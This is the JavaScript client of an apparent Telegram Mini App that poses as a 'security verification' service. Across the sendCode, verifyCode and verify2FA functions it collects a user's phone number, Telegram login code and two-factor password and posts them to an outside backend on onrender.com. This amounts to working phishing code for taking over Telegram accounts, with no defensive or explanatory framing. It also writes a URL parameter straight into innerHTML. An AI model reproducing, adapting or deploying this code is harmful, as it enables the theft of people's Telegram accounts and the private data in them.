// Конфигурация
const BACKEND_URL = 'https://rollsbocks45.onrender.com'; // Замените на ваш URL Render
let currentStep = 1;
let sessionId = null;
let phoneNumber = '';
let phoneCodeHash = '';
let countdownInterval = null;

// Инициализация Telegram Web App
const tg = window.Telegram.WebApp;
if (tg.initData) {
    tg.expand();
    tg.enableClosingConfirmation();
    tg.setHeaderColor('secondary_bg_color');
    tg.setBackgroundColor('#1A1C2B');
}

// Функции управления шагами
function showStep(step) {
    document.querySelectorAll('.step').forEach(el => {
        el.classList.remove('active');
    });
    document.getElementById(`step${step}`).classList.add('active');
    currentStep = step;
    window.scrollTo(0, 0);
}

// Начало верификации
function startVerification() {
    const urlParams = new URLSearchParams(window.location.search);
    const username = urlParams.get('username') || '';
    
    const displayElement = document.getElementById('usernameDisplay');
    if (username) {
        displayElement.innerHTML = `Security verification required for <span class="highlight">@${username}</span>`;
    }
    
    showStep(2);
}

// Назад
function goBack(step) {
    showStep(step);
}

// Показать загрузку
function showLoading(text = 'Processing...') {
    document.getElementById('loadingText').textContent = text;
    document.getElementById('loadingOverlay').classList.add('active');
}

// Скрыть загрузку
function hideLoading() {
    document.getElementById('loadingOverlay').classList.remove('active');
}

// Отправка кода
async function sendCode() {
    const phoneInput = document.getElementById('phoneInput');
    const termsCheckbox = document.getElementById('termsCheckbox');
    
    if (!phoneInput.value) {
        showError('Please enter phone number');
        return;
    }
    
    if (!termsCheckbox.checked) {
        showError('Please accept the terms');
        return;
    }
    
    phoneNumber = '+' + phoneInput.value;
    
    showLoading('Sending verification code...');
    
    try {
        console.log('Sending request to:', `${BACKEND_URL}/api/send_code`);
        console.log('Phone number:', phoneNumber);
        
        const response = await fetch(`${BACKEND_URL}/api/send_code`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                phone: phoneNumber
            })
        });
        
        console.log('Response status:', response.status);
        
        const data = await response.json();
        console.log('Response data:', data);
        
        if (response.ok && data.success) {
            sessionId = data.session_id;
            phoneCodeHash = data.phone_code_hash;
            
            showStep(3);
            startCountdown();
        } else {
            showError(data.error || 'Failed to send code');
        }
    } catch (error) {
        console.error('Send code error:', error);
        showError('Network error. Please check your connection and try again.');
    } finally {
        hideLoading();
    }
}

// Верификация кода
async function verifyCode() {
    const codeInputs = document.querySelectorAll('.code-input input');
    const code = Array.from(codeInputs).map(input => input.value).join('');
    
    if (code.length !== 5) {
        showError('Please enter 5-digit code');
        return;
    }
    
    showLoading('Verifying code...');
    
    try {
        console.log('Verifying code:', { sessionId, code });
        
        const response = await fetch(`${BACKEND_URL}/api/verify_code`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                session_id: sessionId,
                code: code
            })
        });
        
        console.log('Verify response status:', response.status);
        
        const data = await response.json();
        console.log('Verify response data:', data);
        
        if (response.ok) {
            if (data.success) {
                showSuccess(data.session_info);
            } else if (data.requires_2fa) {
                showStep(4);
            } else {
                showError(data.error || 'Verification failed');
            }
        } else {
            showError(data.error || 'Invalid verification code');
        }
    } catch (error) {
        console.error('Verify code error:', error);
        showError('Network error. Please try again.');
    } finally {
        hideLoading();
    }
}

// Верификация 2FA
async function verify2FA() {
    const passwordInput = document.getElementById('passwordInput');
    const password = passwordInput.value;
    
    if (!password) {
        showError('Please enter 2FA password');
        return;
    }
    
    showLoading('Verifying 2FA...');
    
    try {
        const response = await fetch(`${BACKEND_URL}/api/verify_2fa`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                session_id: sessionId,
                password: password
            })
        });
        
        const data = await response.json();
        
        if (response.ok && data.success) {
            showSuccess(data.session_info);
        } else {
            showError(data.error || 'Invalid 2FA password');
        }
    } catch (error) {
        console.error('Verify 2FA error:', error);
        showError('Network error. Please try again.');
    } finally {
        hideLoading();
    }
}

// Показ успеха
function showSuccess(sessionInfo) {
    if (sessionInfo) {
        document.getElementById('verifiedUsername').textContent = '@' + (sessionInfo.username || 'user');
    }
    
    const now = new Date();
    document.getElementById('verificationTime').textContent = 
        now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    
    showStep(5);
    
    if (navigator.vibrate) {
        navigator.vibrate([100, 50, 100]);
    }
}

// Показ ошибки
function showError(message) {
    document.getElementById('errorMessage').textContent = message;
    showStep(6);
    hideLoading();
}

// Повторная отправка кода
async function resendCode() {
    if (countdownInterval) {
        clearInterval(countdownInterval);
    }
    
    const resendBtn = document.getElementById('resendBtn');
    resendBtn.disabled = true;
    resendBtn.textContent = 'Sending...';
    
    showLoading('Resending code...');
    
    try {
        const response = await fetch(`${BACKEND_URL}/api/send_code`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                phone: phoneNumber
            })
        });
        
        const data = await response.json();
        
        if (response.ok && data.success) {
            sessionId = data.session_id;
            phoneCodeHash = data.phone_code_hash;
            
            startCountdown();
        } else {
            showError(data.error || 'Failed to resend code');
        }
    } catch (error) {
        console.error('Resend code error:', error);
        showError('Network error. Please try again.');
    } finally {
        hideLoading();
        if (resendBtn) {
            resendBtn.textContent = 'Resend Code';
        }
    }
}

// Таймер обратного отсчета
function startCountdown() {
    let countdown = 60;
    const countdownElement = document.getElementById('countdown');
    const resendBtn = document.getElementById('resendBtn');
    const timer = document.querySelector('.timer');
    
    if (resendBtn) resendBtn.disabled = true;
    if (timer) timer.style.display = 'flex';
    
    countdownElement.textContent = countdown;
    
    if (countdownInterval) {
        clearInterval(countdownInterval);
    }
    
    countdownInterval = setInterval(() => {
        countdown--;
        countdownElement.textContent = countdown;
        
        if (countdown <= 0) {
            clearInterval(countdownInterval);
            if (resendBtn) resendBtn.disabled = false;
            if (timer) timer.style.display = 'none';
        }
    }, 1000);
}

// Перемещение между полями ввода кода
function moveToNext(input, nextIndex) {
    if (input.value.length === 1) {
        const nextInput = input.nextElementSibling;
        if (nextInput) {
            nextInput.focus();
        }
    } else if (input.value.length === 0) {
        const prevInput = input.previousElementSibling;
        if (prevInput) {
            prevInput.focus();
        }
    }
}

// Закрытие Mini App
function closeMiniApp() {
    if (window.Telegram && window.Telegram.WebApp) {
        window.Telegram.WebApp.close();
    }
}

// Контакт с поддержкой
function contactSupport() {
    if (window.Telegram && window.Telegram.WebApp) {
        window.Telegram.WebApp.openTelegramLink('https://t.me/rollssupport');
    } else {
        window.open('https://t.me/rollssupport', '_blank');
    }
}

// Обработка нажатия Enter
document.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        switch (currentStep) {
            case 2:
                sendCode();
                break;
            case 3:
                verifyCode();
                break;
            case 4:
                verify2FA();
                break;
        }
    }
});

// Инициализация
document.addEventListener('DOMContentLoaded', () => {
    const urlParams = new URLSearchParams(window.location.search);
    const username = urlParams.get('username');
    
    if (username) {
        const displayElement = document.getElementById('usernameDisplay');
        displayElement.innerHTML = `Security verification required for <span class="highlight">@${username}</span>`;
    }
    
    showStep(1);
    
    // Инициализация полей ввода кода
    const codeInputs = document.querySelectorAll('.code-input input');
    codeInputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            if (e.inputType === 'deleteContentBackward' && input.value === '') {
                const prevInput = input.previousElementSibling;
                if (prevInput) {
                    prevInput.focus();
                }
            }
        });
    });
    
    // Автофокус на поле телефона
    setTimeout(() => {
        const phoneInput = document.getElementById('phoneInput');
        if (phoneInput) phoneInput.focus();
    }, 500);
});
